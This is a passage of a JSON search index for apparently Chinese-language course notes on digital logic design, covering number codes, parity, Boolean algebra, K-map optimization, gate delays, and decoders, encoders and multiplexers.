<p>\u7531\u4e8eBCD\u7f16\u7801\u662f\u752810\u4e2d\u6392\u5217\u6765\u8868\u793a\u4e8c\u8fdb\u5236\uff0c\u5176\u52a0\u6cd5\u8fd0\u7b97\u81ea\u7136\u4e5f\u548c\u4e8c\u8fdb\u5236\u52a0\u6cd5\u4e0d\u540c\uff1a</p> <ul> <li>Step 1: \u6b63\u5e38\u52a0\u6cd5\uff0c\u5f97\u5230SUM:<ul> <li></li> </ul> </li> <li>Step 2: \u5982\u679c\u5f53\u524d\u7684SUM\u5927\u4e8e9(Invalid Code)\uff0c\u5219\u7ed9\u5f53\u524d\u4f4d\u7684\u4e0b\u4e00\u4e2a\u9ad8\u4f4d\u8fdb\u4e00\u4e2aCarry\uff0c\u5e76\u7ed9\u81ea\u5df1Add 6(0110)\uff0c\u5f97\u5230\u7ed3\u679c:<ul> <li></li> </ul> </li> </ul> <p>1897 + 2905 = 4802</p> <p></p>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#3-84-2-1","title":"\u4f593\u7801 &amp; 8,4,-2,-1","text":"<p>\u4e8c\u8005\u7684\u5171\u540c\u70b9\u5728\u4e8e\u90fd\u662fComplement Code</p>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#_3","title":"\u683c\u96f7\u7801","text":"<p>\u683c\u96f7\u7801\u7684\u4f18\u52bf\u5728\u4e8e\u76f8\u90bb\u7684\u4e24\u4e2a\u6570\u53ea\u6709\u4e00\u4f4d\u662f\u4e0d\u540c\u7684\uff0c\u8fd9\u975e\u5e38\u4fbf\u4e8e\u6211\u4eec\u8fdb\u884c\u68c0\u9a8c\u6821\u5bf9\u3002(\u4ee5\u53ca\u540e\u9762\u8981\u5b66\u7684\u5361\u8bfa\u56fe\u4f18\u5316)</p>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#_4","title":"\u5982\u4f55\u5f97\u5230\u683c\u96f7\u7801?","text":"<p>\u5148\u5217\u51fa\u5bf9\u5e94\u7684BCD\u7f16\u7801\uff0c\u518d\u6309\u7167 \u683c\u96f7\u7801\u5f53\u524d\u4f4d\u7684\u6570\u5b57 = BCD\u7801\u5bf9\u5e94\u4f4d\u7684\u6570\u5b57 or BCD\u7801\u5bf9\u5e94\u4f4d\u7684\u4e0b\u4e00\u4e2a\u9ad8\u4f4d\u7684\u6570\u5b57 \u8ba1\u7b97\u3002 (\\(Grey_i\\ =\\ BCD_i\\  ||\\  BCD_{i+1}\\))</p>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#_5","title":"\u5947\u5076\u6821\u9a8c\u4f4d","text":"<ul> <li>Even Parity \u6307\u4f7f1\u7684\u6570\u91cf\u4e3a\u5076\u6570<ul> <li>Eg: 0111_0101 -&gt; 0111_0101_1</li> <li>\u4e8b\u5b9e\u4e0a\uff0c\u6821\u9a8c\u7801\u65e2\u53ef\u4ee5\u52a0\u5230\u524d\u9762\u4e5f\u53ef\u4ee5\u52a0\u5230\u540e\u9762\uff0c\u8981\u770b\u9898\u76ee\u8981\u6c42</li> <li>\u5bf9\u4e8e\u5f02\u6216\u51fd\u6570 \\(F= X\\oplus Y=X\\overline{Y}+\\overline{X}Y\\) \uff0c\u53ef\u4ee5\u7528\u4f5c\u5947\u51fd\u6570<ul> <li>Odd Function\u6709\u5947\u6570\u4e2a1\u5219\u8f93\u51fa1\uff0c\u53ef\u7528\u6765\u751f\u6210 \u5076\u6821\u9a8c\u7801 </li> </ul> </li> </ul> </li> <li>Odd Parity \u5219\u76f8\u53cd<ul> <li>\u53ef\u4ee5\u7528\u5076\u51fd\u6570\u6765\u751f\u6210 \u5947\u6821\u9a8c\u7801<ul> <li>\u6ce8\u610f\uff0c\u5076\u51fd\u6570\u662f\u5947\u51fd\u6570\u975e\u4e00\u4e0b\u54e6\uff0c\u4e0d\u662f\u7528\u5f02\u6216\u975e\u8fde\u8d77\u6765</li> </ul> </li> </ul> </li> </ul> <p>\u3010\u5173\u4e8e\u5f02\u6216\uff0c\u8fd8\u6709\u5982\u4e0b\u8981\u70b9\u3011\uff1a</p> <ul> <li>\\(X\\oplus 1=\\overline{X}\\)<ul> <li>\\((\\overline{X\\oplus Y})=(X\\oplus Y)\\oplus 1 =\\overline{X}\\oplus Y=X\\oplus \\overline{Y}\\) \u4ea4\u6362\u5b9a\u5f8b</li> </ul> </li> </ul> \u4f8b\u9898\u7b54\u6848 <p>Which of the following logical gates can be used as a controllable inverter?</p> <p>XOR Gate \u56e0\u4e3a \\(1\\oplus X = \\overline{X}\\)</p> <p></p>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#universal-gate","title":"Universal Gate \u901a\u7528\u95e8","text":"<ul> <li>A gate type that can implement all possible Boolean functions<ul> <li>\u76ee\u524d\u53ea\u6307 NOR \u4ee5\u53ca NAND</li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#duality-rule-complement","title":"Duality Rule &amp; Complement \u5bf9\u5076\u89c4\u5219 \u4e0e \u4e92\u8865","text":"<ul> <li>\u539f\u51fd\u6570 \\(F=\\overline{A}{B}+C\\overline{D} +0\\)</li> <li>\u5bf9\u5076\u51fd\u6570 \\(F=(\\overline{A}+B)(C+\\overline{D})\\cdot 1\\) (\u5982\u679c\u51fa\u73b0 0 \u6216 1\uff0c\u8fd8\u8981\u989d\u5916\u628a\u5b83\u4eec\u4e92\u6362)</li> <li>\u4e92\u8865\u51fd\u6570 \\(\\overline{F}=(A+\\overline{B})(\\overline{C}+D)\\cdot 1\\)</li> </ul> <p>Complement \u8003\u8bd5\u53ef\u80fd\u4f1a\u51fa\u9898\uff0c\u6ce8\u610f\u662f\u4ec5\u4ec5\u6bd4 Dual \u591a\u4e00\u4e2a \\(X\\) \u4e0e \\(\\overline{X}\\) \u4e92\u76f8\u8f6c\u6362</p> <p></p>"},{"location":"Courses/DD/note/Chapter%201%20%26%202%20Part%201%20Digital%20System%20%26%20Boolean%20Equation/#boolean-algebra","title":"Boolean Algebra \u5e03\u5c14\u4ee3\u6570","text":"<p>\u5176\u4e2d\u5c24\u5176\u9700\u8981\u8bb0\u4f4f Simplification \u548c Consensus</p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/","title":"CH 2 P2. Circuit Optimization","text":""},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#chapter-2-p2-circuit-optimization","title":"Chapter 2 P2 Circuit Optimization","text":"<p> \u7ea6 635 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#canonical-forms","title":"Canonical Forms \u89c4\u8303\u578b","text":"<p>Two common Canonical Forms:</p> <ul> <li>Sum of Minterms (SOM)</li> <li>Product of Maxterms (POM)</li> </ul> <p>SOM \u548c POM \u662f\u4e0d\u5316\u7b80\u7684\uff0c\u6ce8\u610f\u548c\u6807\u51c6\u578b\u7684\u533a\u522b</p> <p>\u3010Example\u3011\uff1a</p> <ul> <li>\\(F =\\overline{X}\\overline{Y} +X\\overline{Y} = \\sum_{m}(0,2)\\)     SOM</li> <li>\\(F =(X+\\overline{Y})(\\overline{X}+\\overline{Y}) = \\prod_{m}(1,3)\\)    POM</li> </ul> <p></p> <p>\u7279\u522b\u91cd\u8981\u516c\u5f0f\uff1a \\(x+yz = (x+y)(x+z)\\)</p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#standard-forms","title":"Standard Forms \u6807\u51c6\u578b","text":"<p>\u5c06\u89c4\u8303\u578b\u5316\u81f3\u6700\u7b80\u4fbf\u662f\u6807\u51c6\u578b</p> <ul> <li>Standard Sum-of-Products (SOP) form: <ul> <li>\\(ABC+\\overline{A}\\overline{B}C+B\\)</li> </ul> </li> <li>Standard Product-of-Sums (POS) form:<ul> <li>\\((A+B)(A+\\overline{B}+\\overline{C})C\\)</li> </ul> </li> </ul> <p>\u6ce8\u610f\uff01</p> <p>\\((AB+C)(A+C)\u3001AB\\overline{C}+AC(A+B)\\) \u90fd\u4e0d\u662f\u6807\u51c6\u578b\uff01\uff01</p> <p>\u601d\u8003</p> <p>Relation between SOM and POM\uff1f SOM and SOP?</p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#cost-criteria","title":"Cost Criteria","text":"<ul> <li>Literal cost\uff08L\uff09</li> <li>Gate input cost\uff08G\uff09</li> <li>Gate input cost with NOTs\uff08GN<ul> <li>\u6570\u975e\u95e8\u7684\u65f6\u5019\u540c\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u7528\u6570\u4e24\u6b21,\u4f8b\u5982\u4e0b\u56fe\u7b2c\u4e09\u4e2a\u4f8b\u5b50,\\(\\overline{B}\\) \u53ea\u6570\u4e86\u4e00\u6b21\uff0c\u6240\u4ee5GN=G+3</li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#k-map","title":"K-map","text":"\u56db\u7ef4\u5361\u8bfa\u56fe <p>Don't Care</p> <p>\u4e0d\u5b9a\u9879\uff0c\u5728\u5361\u8bfa\u56fe\u4e2d\u7528X\u8868\u793a\uff0c\u5728\u6700\u5c0f\u9879\u4e4b\u548c\u4e2d\u7528 \\(\\sum d(...)\\) \u8868\u793a\uff0c\u53ef\u4ee5\u968f\u4fbf\u5b9a\u4e49\u5b83\u7684\u503c</p> \u4f8b\u9898\u7b54\u6848 <p>Four variables odd function has ___ \u201c1\u201d squares in its corresponding K-Map.</p> <p>8 , \u56db\u4e2a\u53d8\u91cf\uff0c\u8bf4\u660e\u5171\u670916\u79cd\u53d6\u503c\uff0c\u6709\u4e00\u534a\u88ab1\u586b\u4e0a(\u9519\u4f4d\u586b\u5165K-Map)</p> \u4e09\u7ef4\u5361\u8bfa\u56fe <p> </p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#_1","title":"\u8574\u542b\u9879\u3001\u4e3b\u8574\u542b\u9879\u4e0e\u57fa\u672c\u4e3b\u8574\u542b\u9879","text":"<ul> <li>\u5728\u5361\u8bfa\u56fe\u4e2d\uff0c\u4e00\u4e2a\u8574\u542b\u9879 (Implicant) \u5c31\u662f\u4efb\u610f\u4e00\u4e2a\u5305\u542b\u00a0\\(2^n\\)\u00a0\u4e2a\u00a01\u00a0\u7684\u5355\u5143\uff1b</li> <li>\u800c\u4e3b\u8574\u542b\u9879 (Prime Implicant) \u5219\u662f\u5728\u5361\u8bfa\u56fe\u4e2d\u7684\u00a0\u6781\u5927\u00a0\u8574\u542b\u9879\uff1b<ul> <li>\u5bf9\u4e8e\u5b58\u5728 Dont'cares \u7684 K-map\uff0c\u5982\u679c\u6211\u4eec\u5173\u6ce8\u7684\u662f\u00a01\uff0c\u90a3\u6211\u4eec\u79ef\u6781\u5730\u5c06\u4ed6\u4eec\u5f53\u4f5c\u00a01\u00a0\u6765\u5904\u7406\uff0c\u53cd\u4e4b\u4ea6\u7136\uff1b</li> <li>\u4f46\u662f\u5355\u72ec\u7684\u00a0X\u00a0\u4e0d\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e3b\u8574\u542b\u9879\uff1b</li> </ul> </li> <li>\u57fa\u672c\u4e3b\u8574\u542b\u9879 (Essential Prime Implicant) \u662f\u5305\u542b\u53ea\u88ab\u5b83\u8986\u76d6\u7684\u00a01\u00a0\u7684\u4e3b\u8574\u542b\u9879\uff1b</li> </ul> <p>\u5bf9\u4e8e\u4efb\u610f\u51fd\u6570\uff0c\u4e3b\u8574\u542b\u9879\u4e00\u5b9a\u5b58\u5728\uff0c\u4f46\u662f\u57fa\u672c\u4e3b\u8574\u542b\u9879\u4e0d\u4e00\u5b9a\u5b58\u5728</p> <p></p> <p>\u4e0a\u56fe\u4e2d\uff0c\u5171\u6709\u4e09\u4e2a\u4e3b\u8574\u542b\u9879\uff0c\u5176\u4e2d\u4e24\u4e2a\u4e3a\u57fa\u672c\u4e3b\u8574\u542b\u9879\uff0c\u4e00\u4e2a\u4e3a\u5197\u4f59(Redundant)\u4e3b\u8574\u542b\u9879</p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#buffer","title":"BUFFER \u7f13\u51b2\u5668","text":"<p>\u529f\u80fd\u51fd\u6570\uff1a F = X</p> <p>An electronic amplifier used to improve circuit voltage levels and speed.</p> <p>\u5f53\u4e00\u4e2a\u8f93\u5165\u9700\u8981\u540c\u65f6\u63a5\u5165\u591a\u4e2a\u903b\u8f91\u95e8\u7684\u65f6\u5019\u4f7f\u7528\uff1a</p> <p></p>"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#3-state-buffer","title":"3-state Buffer \uff08\u4e09\u6001\u95e8\uff09","text":"<p>\u5f53\u4f7f\u80fd\u4fe1\u53f7EN\u4e3a0\u65f6\uff0c\u8f93\u51fa\u9ad8\u963bZ\u3002</p> <p>Truth Table:</p> EN IN OUT 0 x Hi-Z 1 0 0 1 1 1"},{"location":"Courses/DD/note/Chapter%202%20P2%20Circuit%20Optimization/#derived-use","title":"Derived use","text":"<ul> <li>A - AND</li> <li>O - OR</li> <li>I - Inverter</li> </ul> <p>\u3010Example\u3011\uff1a</p> <ul> <li><code>2 - 2 AOI</code> -&gt; \\(F=\\overline{WX+YZ}\\)</li> <li><code>2 - 2 - 1 AO</code> -&gt; \\(F= WX+YZ+V\\)</li> <li><code>2 - 2 AI</code> -&gt; \\(F=\\overline{(W+X)(Y+Z)}\\)</li> </ul>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/","title":"CH 3. Combinational Logic Design","text":""},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#chapter-3-combinational-logic-design","title":"Chapter 3 Combinational Logic Design","text":"<p> \u7ea6 2917 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#part-1-implementation-technology-and-logic-design","title":"Part 1 \uff1aImplementation Technology and Logic Design","text":""},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#definition-of-two-types-of-logic-circuits","title":"Definition Of Two Types Of Logic Circuits","text":"<ul> <li>Combinational Circuit \u7ec4\u5408\u7535\u8def<ul> <li>A combinational circuit consists of logic gates whose output is a function of only the present input.</li> </ul> </li> <li>Sequential Logic Circuit \u65f6\u5e8f\u903b\u8f91\u7535\u8def<ul> <li>Sequential logic is a type of logic circuit whose output depends not only on the present value of its input signals but on the sequence of past inputs (state or memory).</li> </ul> </li> </ul> <p>Hierarchy Design \u5206\u5c42\u8bbe\u8ba1</p> <ul> <li>Top-Down \uff1a \u4ece\u9700\u6c42\u5f00\u59cb\uff0c\u81ea\u9876\u5411\u4e0b\u5206\u89e3\u529f\u80fd\u8bbe\u8ba1</li> <li>Bottom-Up \uff1a \u6839\u636e\u73b0\u6709\u5143\u4ef6\u53bb\u7ec4\u5408\u76ee\u6807\u529f\u80fd</li> </ul>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#technology-parameters","title":"Technology Parameters","text":"<p>\u8bbe\u8ba1\u8fc7\u7a0b\u4e2d\u7684\u6280\u672f\u53c2\u6570\u5305\u542b\uff1a</p> <ul> <li>Technology Parameters<ul> <li>fan-in , fan-out</li> <li>noise margin</li> <li>cost</li> <li>transition time</li> <li>propagation delay</li> <li>power dissipation \u80fd\u91cf\u635f\u8017</li> </ul> </li> </ul> <p>Fan-in &amp; Fan-out</p> <ul> <li>Fan-in \u662f\u4e00\u4e2a\u903b\u8f91\u95e8\u80fd\u591f\u63a5\u53d7\u7684\u6700\u591a\u8f93\u5165\uff0c\u5982\u679c\u8d85\u8fc7\u4e86\uff0c\u8f93\u51fa\u4f1a\u53d8\u4e3a undefined \u6216\u8005 incorrect</li> <li>Fan-out \u662f\u4e00\u4e2a\u903b\u8f91\u95e8\u7684\u8f93\u51fa\u6240\u80fd\u8fde\u63a5\u5230\u6700\u591a\u7684\u8f93\u5165\uff08\u6216\u79f0\u8d1f\u8f7d load\uff09\uff0c\u4e14\u4e0d\u5f71\u54cd\u7535\u8def\u6b63\u5e38\u6027\u80fd\u7684\u4e2a\u6570</li> </ul> <p> </p> <p>Fan-in\u7684\u539f\u56e0\uff0c\u4ee5\u4e0e\u95e8\u4e3a\u4f8b</p> <p></p> <p>\u6bcf\u63a5\u5165\u4e00\u4e2a\u8f93\u5165\uff0c\u8f93\u51fa\u7535\u538b\u5c31\u4f1a\u964d 0.3 V \uff0c\u63a5\u592a\u591a(\u5982\u4e0a\u56fe\u76847)\uff0c\u8f93\u51fa\u7535\u538b\u5c31\u4e0d\u5728High Level\u7684\u533a\u95f4\u4e86</p> <p>Propagation Delay</p> <p>\u4f20\u8f93\u5ef6\u8fdf\u662f\u8f93\u5165\u6539\u53d8\u5bf9\u5e94\u7684\u53d8\u5316\u5230\u8f93\u51fa\u6539\u53d8\u6240\u9700\u7684\u65f6\u95f4</p> <p>\u76f8\u5bf9\u800c\u8a00\uff0c\\(t_{HL}\\)  \u4e0e \\(t_{LH}\\) \u90fd\u662f\u6307\u8f93\u51fa\u7684\u53d8\u5316\u65f6\u95f4\uff1b\u800c \\(t_{PHL}\\) \u4e0e \\(t_{PLH}\\) \u5219\u8ba1\u7b97\u4e86 L \u548c H \u7684\u4e2d\u70b9\u65f6\u95f4\u5dee</p> <p></p> <p></p> <ul> <li>Transition time : \u8fc7\u6e21\u65f6\u95f4 \uff0c\u4e13\u6ce8\u4e8e\u8f93\u51fa\u7684\u53d8\u5316\uff0c\u53ea\u9700\u8981\u770b\u8f93\u51fa\u7684\u65f6\u5e8f\u56fe\u5c31\u53ef\u4ee5</li> <li>Propagation delay : \u4f20\u8f93\u5ef6\u8fdf\uff0c\u5305\u542b\u8f93\u5165\u548c\u8f93\u51fa\u7684\u53d8\u5316\u7684\u6574\u4e2a\u8fc7\u7a0b\uff0c\u901a\u8fc7\u6bd4\u8f83\u8f93\u5165\u548c\u8f93\u51fa\u7684\u504f\u5dee\u6765\u8868\u793a</li> </ul> <p>\\(t_{pd}\\)</p> <p>\u6b64\u5916\uff0c\u6211\u4eec\u8fd8\u5f15\u5165\u4e00\u4e2a \\(t_{pd}\\) \u6765\u7edf\u4e00\u8868\u793a \\(t_{phl}\u548ct_{plh}\\)\uff0c\u4e00\u822c\u5c06 \\(t_{pd}\\) \u8bbe\u4e3a \\(\\frac{t_{phl}+ t_{plh}}{2}\\)\u6216\u8005\\(max(t_{phl}+t_{plh})\\)</p> <p>\u5728\u4eff\u771f\u4e2d\uff0c\u6211\u4eec\u5e38\u7528 Delay models \u6709</p> <ul> <li>Transport delay  (\u4f20\u8f93\u5ef6\u8fdf)</li> <li>Inertial delay \uff08\u60ef\u6027\u5ef6\u8fdf\u3001\u56fa\u6709\u5ef6\u8fdf\uff09<ul> <li>Rejection Time (\u62d2\u7edd\u65f6\u95f4)</li> </ul> </li> </ul> Transport delayInertial delay <ul> <li>A change in the output in response to a change on the inputs occurs after a fixed specified delay.</li> <li></li> </ul> <ul> <li>A pulse of duration less than the inertial delay (rejection time) does not contain enough energy to cause the device to switch.</li> <li></li> </ul> Example <p></p> <p>Rejection Time</p> <p>\u62d2\u7edd\u65f6\u95f4\u7528\u6765\u6d88\u9664\u6bdb\u523a\uff0c\u5f53\u7535\u4f4d\u53d8\u5316\u65f6\u95f4\u8fc7\u4e8e\u77ed\uff0c\u5219\u4e0d\u8003\u8651</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#logic-synthesis","title":"Logic Synthesis","text":"<p>\u8003\u8651\u8fd9\u4e9b\u56e0\u7d20\uff0c\u6211\u4eec\u5728logic synthesis\u4e2d\u6709\u5fc5\u8981\u7cbe\u9009Technology mapping</p> <p></p> <p>\u5176\u4e2d\u6620\u5c04\u7684\u4e00\u4e2a\u91cd\u8981\u6b65\u9aa4\u662f\u627e\u5230\u539f\u59cb\u903b\u8f91\u4e0e\u76ee\u6807\u6280\u672f\u7684\u903b\u8f91\u7b49\u4ef7\u5173\u7cfb</p> <p>\u4e3a\u4e86\u505a\u5230\u8fd9\u4e2a\u6b65\u9aa4\uff0c\u6211\u4eec\u9700\u8981\uff1aMapping to NAND gates (\u5de5\u827a\u6620\u5c04)</p> <ol> <li>\u5c06\u6240\u6709AND OR\u90fd\u7528 NAND \u4e0e Inverter \u4ee3\u66ff</li> <li>\u5c06inverter push \u5230 fan-out \u4e2d</li> <li>\u5982\u679c inverter \u53ef\u4ee5\u914d\u5bf9\uff0c\u5219\u6d88\u53bb</li> </ol> <p>Example</p> <p></p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#_1","title":"\u6b63\u903b\u8f91\u4e0e\u8d1f\u903b\u8f91","text":"<p>\u6b63\u903b\u8f91(Positive Logic)\u5c31\u662f1\u4e3a\u6709\u6548\u4fe1\u53f7\uff0c\u8d1f\u903b\u8f91(Negative Logic)\u5c31\u662f0\u4e3a\u6709\u6548\u4fe1\u53f7\u3002</p> <p>\u5728\u6b63\u903b\u8f91\u4e2d\u7684AND\u95e8\u76f8\u5f53\u4e8e\u8d1f\u903b\u8f91\u4e2d\u7684OR\u95e8\u3002</p> <p></p> <p>\u5982\u4e0a\u56fe\uff0c\u5de6\u4fa7\u4ee3\u8868\u6b63\u903b\u8f91\uff0c\u53f3\u4fa7\u4ee3\u8868\u8d1f\u903b\u8f91</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#part-2-combinational-logic","title":"Part 2 : Combinational Logic","text":""},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#rudimentary-logic-functions","title":"Rudimentary Logic Functions","text":"<ul> <li>\u5e38\u91cf\u51fd\u6570 Value - Fixing \\(F = 0\\) or \\(F = 1\\) </li> <li>\u4f20\u8f93\u51fd\u6570 Transferring \\(F = X\\) </li> <li>\u9006\u53d8\u51fd\u6570 Inverting \\(F = \\overline{X}\\)</li> <li>\u4f7f\u80fd\u51fd\u6570 Enabling \\(F = X \\cdot EN or F = X + \\overline{EN}\\)</li> </ul>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#functional-blocks","title":"Functional Blocks","text":"<ul> <li>\u8bd1\u7801\u5668 Decoder</li> <li>\u7f16\u7801\u5668 Encoder</li> <li>\u591a\u8def\u9009\u62e9\u5668 Multiplexer MUX</li> <li>\u4fe1\u53f7\u5206\u914d\u5668 Demultiplexer DEMUX \u6570\u903b\u4e0d\u8003</li> </ul>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#1-decoder","title":"1. Decoder \u8bd1\u7801\u5668","text":"<p>Decoding \uff1athe conversion of an n-bit input code to an m-bit output code with n &lt;= m &lt;= 2n such that each valid code word produces a unique output code</p> <p>\u4f8b\u5982\u5b9e\u9a8c lab5 \u7684 3-8\u8bd1\u7801\u5668 \u4ee5\u53calab6 \u7684 BCD to 7-segment decoder</p> <ul> <li>\u4e00\u4e2a\u9ad8\u7ea7\u7684Decoder\u7684\u8bbe\u8ba1\u53ef\u4ee5\u91c7\u7528hierarchical design\u8bbe\u8ba1\u601d\u60f3<ul> <li>\u4f8b\u5982\uff0c\u4e00\u4e2a3-8\u8bd1\u7801\u5668\u53ef\u4ee5\u7531\u4e00\u4e2a2-4\u8bd1\u7801\u5668\u548c\u4e00\u4e2a1-2\u8bd1\u7801\u5668\u7ec4\u5408\u800c\u6210\uff1a</li> <li></li> </ul> </li> <li>\u53e6\u5916\uff0cDecoder\u4e00\u822c\u4f1a\u6709\u4f7f\u80fd\u4fe1\u53f7EN\u6765\u63a7\u5236\u3002<ul> <li></li> <li>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4e5f\u53ef\u628a\u8bd1\u7801\u5668\u5f53\u4f5cdemultiplexer\uff08\u4fe1\u53f7\u5206\u79bb\u5668\u3001\u591a\u8def\u89e3\u8c03\u5668\uff09\u770b\u5f85\u3002</li> <li>b\u548ca\u7684\u503c\u63a7\u5236\u4f7f\u80fd\u4fe1\u53f7EN\u7684\u6d41\u5411\uff0c\u5f53EN =0 \u65f6\uff0c\u65e0\u8bbab\u3001a\u4e3a\u591a\u5c11\uff0c\u6d41\u51fa\u53bb\u7684\u53ea\u67090\u3002</li> </ul> </li> <li>\u4e5f\u53ef\u4ee5\u5229\u7528\u4f7f\u80fd\u4fe1\u53f7\u7ec4\u5408\u66f4\u5927\u7684Decoder\uff1a<ul> <li></li> </ul> </li> </ul> <p>\u8003\u8bd5\u6709\u53ef\u80fd\u4f1a\u8003\u8bd1\u7801\u5668\u5185\u4e0e\u95e8\u7684\u4e2a\u6570</p> <p>Decoder\u7684\u53e6\u4e00\u4e2a\u5e94\u7528\u662f\uff0c\u53ef\u4ee5\u7528 Decoder \u52a0\u4e0a OR \u95e8\u7ec4\u6210 minterms</p> <p></p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#2-encoder","title":"2. Encoder \u7f16\u7801\u5668","text":"<p>Decimal-to-BCD encoder:</p> <ul> <li>Inputs: 10 bits corresponding to decimal digits 0 through 9 (D<sub>0</sub>, \u2026, D<sub>9</sub>) \u2014\u2014one-hot code<ul> <li>one-hot code: \u53ea\u6709\u4e00\u4f4d\u662f1</li> </ul> </li> <li>Outputs: 4 bits with BCD codes</li> </ul> <p>\u771f\u503c\u8868\u6211\u4eec\u5f88\u5bb9\u6613\u5c31\u80fd\u5f97\u5230\uff1a</p> <p></p> <p>Priority Encoder(\u4f18\u5148\u7ea7\u7f16\u7801\u5668):</p> <ul> <li>\u4f18\u5148\u7ea7\u9ad8\u7684\u8f93\u5165\u5982\u679c\u6709\u6548\uff0c\u5219\u4e0d\u7528\u7ba1\u4f18\u5148\u7ea7\u4f4e\u7684\u8f93\u5165</li> <li>\u771f\u503c\u8868\uff08V\u68c0\u6d4b\u662f\u5426\u6709\u6548\uff09\uff1a<ul> <li></li> </ul> </li> </ul> <p>\u4f18\u5148\u7ea7\u7f16\u7801\u5668\u53ef\u4ee5\u7528 K-map \u72e0\u72e0\u5316\u7b80\u3002</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#3-multiplexer","title":"3. Multiplexer \u591a\u8def\u9009\u62e9\u5668","text":"<p>\u591a\u8def\u9009\u62e9\u5668\u53ef\u901a\u8fc7 Decoder\u3001AND-OR Gates \u6216 3-state buffers \u6765\u5b9e\u73b0</p> <ul> <li>2-to-1-Line Multiplexer: <ul> <li></li> </ul> </li> </ul> <p>In general , an 2<sup>n</sup>-to-1-line multiplexer is combined:</p> <ul> <li>n-to-2<sup>n</sup>-line decoder</li> <li>\\(2^n\\times 2\\ AND-OR\\) </li> </ul> <p>\u4f8b\u5982\uff1a</p> <ul> <li>4-to-1-line \u591a\u8def\u9009\u62e9\u5668\uff1a<ul> <li></li> </ul> </li> <li>\u5982\u679c\u91c7\u7528\u4e09\u6001\u95e8\u6784\u5efa\u7684\u8bdd\u53ef\u4ee5\u7701\u53bb\u6700\u540e\u7684\u6216\u95e8\uff0c\u5e76\u62e5\u6709\u66f4\u5c0f\u7684Gate input cost\uff1a<ul> <li></li> </ul> </li> <li>\u53e6\u4e00\u79cd\u6784\u5efa\u65b9\u6cd5\uff1a<ul> <li></li> </ul> </li> </ul> <p>Success</p> <p>\u591a\u8def\u9009\u62e9\u5668\u53ef\u4ee5\u5e94\u7528\u4e8e\u4e0d\u540c\u7f16\u7801\u4e4b\u95f4\u7684\u8f6c\u6362\uff0c\u5b9e\u73b0\u4efb\u610f\u7684\u903b\u8f91\u51fd\u6570</p> <p>\u5982\uff0cGray to Binary Code\uff1a </p> <p>\u6b64\u5916\uff0c\u6b64\u8f6c\u6362\u8fd8\u53ef\u4ee5\u5c06\u4e00\u90e8\u5206\u8f93\u5165\u5f53\u4f5c\u5e38\u91cf\u7aef\u8fdb\u884c\u964d\u7ef4\u5316\u7b80\uff1a</p> <p></p> <p>\u5316\u7b80\u7684\u89c4\u5219\u4e3a\uff0c\u89c2\u5bdf\u771f\u503c\u8868\uff0c\u5f53\u4e24\u884c\u4e2dA\u3001B\u5404\u81ea\u76f8\u540c\u65f6\uff0c\u82e5\u8f93\u51fa\u5206\u522b\u4e3a0\u30011\uff0c\u5219\u53ef\u7f6eC\u6216~C\uff1b\u82e5\u8f93\u51fa\u5747\u4e3a0\u62161\uff0c\u5219\u7f6e\u5e38\u503c0\u62161\u3002</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#part-3-arithmetic-functions","title":"Part 3 : Arithmetic 